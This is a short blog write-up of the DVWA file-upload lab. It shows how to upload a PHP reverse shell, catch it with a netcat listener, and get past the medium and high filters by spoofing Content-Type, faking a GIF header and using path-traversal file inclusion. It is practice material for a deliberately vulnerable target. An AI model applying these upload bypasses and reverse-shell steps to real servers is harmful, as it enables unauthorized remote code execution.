---
title: "File Upload - DVWA"
description: ""
summary: "Exploit the file upload vulnerability to achieve Remote Code Execution (RCE)."
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "File Upload"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 5
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---

### **Security level: low**

Create PHP reverse shell file `rev.php`.

Refference: https://www.revshells.com/

Listing IP: `192.168.170.131` port: `9001`

netcat listener command: `nc -lvnp 9001`

upload the file `rev.php` and visit the url : `http://192.168.170.131/hackable/uploads/rev.php`

and you have reverse shell:

Output:
  
```Shell
┌─[✗]─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.170.131] from (UNKNOWN) [172.17.0.2] 54022
SOCKET: Shell has connected! PID: 331
whoami
www-data
uname
Linux
```


### **Security level: medium**

This time it is blocking php file we can bypass that by changing:

`Content-Type: application/x-php`  ==>   `Content-Type: image/png`

we can also do that from browser go to inspect element ,Network tab resubmit the request so it show up on network tab select that upload request right click and Edit and Resend:

<img width="407" alt="image" src="https://user-images.githubusercontent.com/79740895/185420346-ab0c9387-7cc6-4402-9376-b3611f35df46.png">

make changes and hit send button,visit the url and you have reverse shell.


### **Security level: high**


Changing Content-Type is not working maybe server is verifying the file header signature.

add `GIF98;` at the start of our exploit file and rename it with `rev.php.png`.

but whene we visit it directly it is not working so we use file inclusion:

url: `http://192.168.170.131/vulnerabilities/fi/?page=file/../../../hackable/uploads/rev.php.png`     <- security high

and we have reverse shell on our netcat listener.

Happy Hacking
